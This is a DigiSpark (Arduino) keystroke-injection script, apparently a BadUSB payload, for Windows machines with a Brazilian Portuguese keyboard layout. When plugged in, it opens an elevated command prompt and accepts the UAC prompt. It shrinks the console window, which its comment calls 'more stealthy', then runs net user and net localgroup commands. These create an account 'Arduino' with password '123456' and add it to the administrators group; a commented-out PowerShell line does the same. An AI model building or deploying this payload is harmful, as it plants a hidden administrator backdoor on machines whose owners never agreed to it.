//This DigiSpark script creates new local user and adds it to "Administrators" group
//Originaly created and tested by Michyus for Windows 10 with English(US) keyboard layout
//Updated by Eduardo Gadotti
// Changed to DigiKeyboardPtBr to work with Portuguese Brazilian layout keyboard
// Added a few led controle to sinalize when the script ends
// Added MODE CON: COLS=15 LINES=1 to be more stealthy
// Changed to Portuguese expected adm group

#include "DigiKeyboardPtBr.h"
void setup() {
}

void loop() {
  digitalWrite(1, HIGH); // LED on <--> Action start

  //open a cmd administrator
  DigiKeyboardPtBr.delay(5000);
  DigiKeyboardPtBr.sendKeyStroke(0, MOD_GUI_LEFT); // open windows menu
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("cmd"); // to search for command prompt
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print("COLOR EF");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(100);
    
  //Uncomment for Windows 10 and later..
  //DigiKeyboardPtBr.print(F("powershell $pass = ConvertTo-SecureString \"P@ssW0rD\" -AsPlainText -Force; New-LocalUser \"accName\" -Password $pass; Add-LocalGroupMember -Group \"Administrators\" -Member \"accName\" "));

  //Windows 8 - create an user
  DigiKeyboardPtBr.println("net user /add Arduino 123456");
  DigiKeyboardPtBr.delay(1000);

  //Make that user become admin  
  DigiKeyboardPtBr.println("net localgroup administradores Arduino /add");
  
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("exit");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);

  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*empty*/ }
}
